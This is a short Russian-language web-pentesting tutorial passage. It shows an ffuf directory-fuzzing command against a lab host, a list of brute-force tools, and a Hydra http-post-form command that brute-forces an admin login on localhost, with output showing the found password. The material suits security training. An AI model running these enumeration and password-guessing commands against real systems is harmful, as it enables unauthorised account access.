### Исследуем веб-приложение на предмет наличия в нем прочих файлов и разделов.

#### Утилита `ffuf`  
[Набор словарей](https://github.com/empty-jack/YAWR/blob/master/Web/files_and_directories/fuzz.txt)  
```
ffuf -w ~/Repositories/YAWR/Web/files_and_directories/fuzz.txt -u http://evil.corp:1337/FUZZ -fc 403
```
Описание ключей:  
- `-w` – путь до файла со словарем;
- `-u` – целевой URL, в который необходимо поместить слово FUZZ для указания места для вставки паттернов из словаря,
- `-fc` – фильтрация кодов HTTP-ответов.

### Перебор паролей

Утилиты:  
- `Burp Suite`
- `Patator`
- `Medusa`
- `Hydra`
- `Owasp Zap`

Пример использования утилиты `Hydra`:  
```
hydra -l admin -P ./realyBest.txt -s 1337 127.0.0.1 http-post-form -m "/admin/:username=^USER^&password=^PASS^:g=:2=:F=>Login</button>"
```

Результат:
```sh
[1337][http-post-form] host: 127.0.0.1   login: admin   password: q1w2e3r4
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-07 14:08:50

```

Словарь для перебора паролей [ссылка](https://github.com/empty-jack/YAWR/blob/master/brute/passwords/realyBest.txt)